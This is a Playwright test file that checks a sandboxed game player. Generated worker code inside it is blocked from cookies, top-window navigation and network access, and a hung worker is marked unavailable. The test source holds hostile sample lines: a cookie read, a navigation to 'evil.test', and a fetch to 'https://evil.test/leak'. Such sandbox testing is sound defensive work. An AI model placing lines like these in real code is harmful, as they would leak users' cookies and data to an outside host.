import { test, expect } from '@playwright/test';
import { readFile } from 'node:fs/promises';
import {
  playerHtml,
  PLAYER_CSP,
} from '../../lib/party-forge/generation/player';
import { validateGame } from '../../scripts/forge/validate-game.mjs';

test('generated worker cannot reach DOM, cookies, navigation or network; hung workers stop', async ({
  page,
}) => {
  const source = `
    let blocked=0;
    try { document.cookie } catch { blocked++ }
    try { window.top.location='https://evil.test/' } catch { blocked++ }
    fetch('https://evil.test/leak').catch(()=>blocked++);
    self.onmessage=()=>setTimeout(()=>self.postMessage({type:'frame',status:'playing',score:blocked,rects:[{x:0,y:0,w:10,h:10,color:'#ffffff'}]}),50);
  `;
  const external: string[] = [];
  await page.route('**/*', (route) => {
    if (route.request().url() === 'https://artifact.test/game')
      return route.fulfill({
        body: playerHtml(source),
        contentType: 'text/html',
        headers: { 'Content-Security-Policy': PLAYER_CSP },
      });
    external.push(route.request().url());
    return route.abort();
  });
  await page.setContent(
    '<iframe sandbox="allow-scripts" src="https://artifact.test/game"></iframe>',
  );
  const frame = page.frameLocator('iframe');
  await frame.getByRole('button', { name: 'Start game' }).click();
  await expect(frame.locator('#score')).toHaveText('Score 3');
  expect(external).toEqual([]);
  expect(page.url()).toBe('about:blank');
  await page.route('https://artifact.test/hung', (route) =>
    route.fulfill({
      body: playerHtml('while(true){}'),
      contentType: 'text/html',
      headers: { 'Content-Security-Policy': PLAYER_CSP },
    }),
  );
  await page.setContent(
    '<iframe sandbox="allow-scripts" src="https://artifact.test/hung"></iframe>',
  );
  await frame.getByRole('button', { name: 'Start game' }).click();
  await expect(frame.locator('#game-state')).toHaveText('unavailable');
});

test('independent validator runs retained worker bytes through the actual player', async () => {
  const source = await readFile('tests/fixtures/forge/worker.js', 'utf8');
  const evidence = await validateGame(source);
  expect(evidence.renderedChange).toBe(true);
  await expect(validateGame('self.onmessage=()=>{}')).rejects.toThrow();
});
